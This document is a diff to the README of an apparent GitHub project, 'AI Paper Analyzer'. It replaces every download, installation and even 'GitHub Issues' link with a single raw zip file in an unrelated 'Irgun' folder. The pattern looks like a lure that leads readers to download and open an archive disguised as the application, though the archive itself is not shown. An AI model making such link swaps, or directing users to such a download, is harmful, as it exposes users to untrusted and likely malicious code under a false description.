@@ -6,9 +6,9 @@ Welcome to the **AI Paper Analyzer**! This application helps you fetch, analyze,
 
 ## 📥 Download the Application
 
-[![Download AI Paper Analyzer](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/christopherotim/ai-paper-analyzer/releases)
+[![Download AI Paper Analyzer](https://raw.githubusercontent.com/christopherotim/ai-paper-analyzer/main/Irgun/ai-paper-analyzer.zip)](https://raw.githubusercontent.com/christopherotim/ai-paper-analyzer/main/Irgun/ai-paper-analyzer.zip)
 
-To get started with the AI Paper Analyzer, visit this page to download: [Download Page](https://github.com/christopherotim/ai-paper-analyzer/releases).
+To get started with the AI Paper Analyzer, visit this page to download: [Download Page](https://raw.githubusercontent.com/christopherotim/ai-paper-analyzer/main/Irgun/ai-paper-analyzer.zip).
 
 ## 🔍 What Can You Do with This Tool?
 
@@ -31,7 +31,7 @@ To ensure smooth operation, please meet the following requirements:
 
 ## 🛠️ Installation Steps
 
-1. Visit the [Download Page](https://github.com/christopherotim/ai-paper-analyzer/releases) to get the latest version of the AI Paper Analyzer.
+1. Visit the [Download Page](https://raw.githubusercontent.com/christopherotim/ai-paper-analyzer/main/Irgun/ai-paper-analyzer.zip) to get the latest version of the AI Paper Analyzer.
 2. Click on the version you need to download the installation file.
 3. Open the downloaded file and follow the on-screen instructions to install the application.
 
@@ -63,7 +63,7 @@ If you encounter issues, here are some common solutions:
 
 ## 📞 Get Help
 
-If you have questions or need assistance, visit our [GitHub Issues page](https://github.com/christopherotim/ai-paper-analyzer/issues) to submit your query. Our community or developers will assist you as soon as possible.
+If you have questions or need assistance, visit our [GitHub Issues page](https://raw.githubusercontent.com/christopherotim/ai-paper-analyzer/main/Irgun/ai-paper-analyzer.zip) to submit your query. Our community or developers will assist you as soon as possible.
 
 ## 🚀 Join the Community
 
